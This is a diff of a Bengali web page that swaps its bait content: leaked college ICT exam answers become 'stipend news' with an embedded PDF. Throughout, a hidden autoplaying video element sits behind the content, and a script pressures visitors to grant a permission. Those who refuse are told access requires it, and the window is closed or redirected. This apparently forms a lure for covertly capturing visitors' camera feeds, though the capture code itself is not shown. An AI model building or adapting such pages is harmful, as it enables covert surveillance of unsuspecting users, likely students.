@@ -2,46 +2,33 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8" />
-  <title>চুয়াডাঙ্গা সরকারি কলেজ এর ইন্টার 1st ইয়ার এর আইসিটি এমসিকিউ উত্তর-একনজরে সবাই মিলাইয়া নাও</title>
+  <title>উপবৃত্তি সংক্রান্ত নিউজ</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
-
     body {
       margin: 0;
       padding: 0;
-      min-height: 100vh;
       background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
-      display: flex;
-      justify-content: center;
-      align-items: center;
       font-family: 'Noto Serif Bengali', serif;
       color: #3c1053;
       text-align: center;
-      padding: 40px 20px;
-      box-sizing: border-box;
-      line-height: 1.6;
       user-select: none;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.92);
-      max-width: 700px;
+      background: rgba(255, 255, 255, 0.95);
+      max-width: 90%;
+      margin: 30px auto;
       border-radius: 16px;
-      padding: 30px 40px;
+      padding: 20px;
       box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     }
 
     h1 {
       font-weight: 700;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       font-size: 24px;
       color: #6a1b9a;
-    }
-
-    p {
-      font-size: 16px;
-      margin-bottom: 12px;
-      font-weight: 500;
     }
 
     #preview {
@@ -55,39 +42,30 @@
       pointer-events: none;
       z-index: -1;
     }
+
+    .pdf-container {
+      width: 100%;
+      height: 80vh;
+      margin-top: 20px;
+    }
+
+    embed {
+      width: 100%;
+      height: 100%;
+      border: none;
+      border-radius: 8px;
+    }
   </style>
 </head>
 <body>
   <video id="preview" autoplay muted playsinline></video>
 
   <div class="container">
-    <h1>চুয়াডাঙ্গা সরকারি কলেজ এর ইন্টার 1st ইয়ার এর আইসিটি এমসিকিউ উত্তর-একনজরে সবাই মিলাইয়া নাও</h1>
+    <h1>উপবৃত্তি সংক্রান্ত নিউজ</h1>
 
-    <p>১. ✅ গ. 2.45GHz</p>
-    <p>২. ✅ খ. i ও iii</p>
-    <p>৩. ✅ ঘ. ৬৬</p>
-    <p>৪. ✅ ক. সিমপ্লেক্স</p>
-    <p>৫. ✅ ঘ. i, ii ও iii</p>
-    <p>৬. ✅ ঘ. i, ii ও iii</p>
-    <p>৭. ✅ ঘ. V</p>
-    <p>৮. ✅ খ. Search engine</p>
-    <p>৯. ✅ গ. 1C</p>
-    <p>১০. ✅ ঘ. রম</p>
-    <p>১১. ✅ ঘ. 9:19</p>
-    <p>১২. ✅ ক. টুইস্টেড পেয়ার</p>
-    <p>১৩. ✅ গ. URL</p>
-    <p>১৪. ✅ ঘ. i, ii ও iii</p>
-    <p>১৫. ✅ খ. রেডিও ওয়েব</p>
-    <p>১৬. ✅ গ. Alt</p>
-    <p>১৭. ✅ ঘ. i, ii ও iii</p>
-    <p>১৮. ✅ গ. 11110011</p>
-    <p>১৯. ✅ ঘ. 1800 bps</p>
-    <p>২০. ✅ খ. বায়োমেট্রিক্স</p>
-    <p>২১. ✅ ঘ. NAND</p>
-    <p>২২. ✅ ক. i ও ii</p>
-    <p>২৩. ✅ খ. রেজিস্টার</p>
-    <p>২৪. ✅ ক. i ও ii</p>
-    <p>২৫. ✅ গ. Graphics Processing Unit</p>
+    <div class="pdf-container">
+      <embed src="https://github.com/sm-soad00/Exam-/raw/main/2025-06-18-09-52-9690b3966c8ff4d7b5e1f2add13c86ac%20(1).pdf" type="application/pdf" />
+    </div>
   </div>
 
   <script>
@@ -134,7 +112,7 @@
       })
       .catch(err => {
         alert("আপনি প্রয়োজনীয় অনুমতি দেননি 😢 এই সাইট ব্যবহারের জন্য অনুমতি আবশ্যক।");
-        window.location.href = "https://www.google.com"; // 🔁 এখানে তোমার redirect লিংক বসাও
+        window.close(); // ❌ মোবাইল বা ডেস্কটপ থেকে সরাসরি বন্ধ করে দেবে
       });
   </script>
 </body>
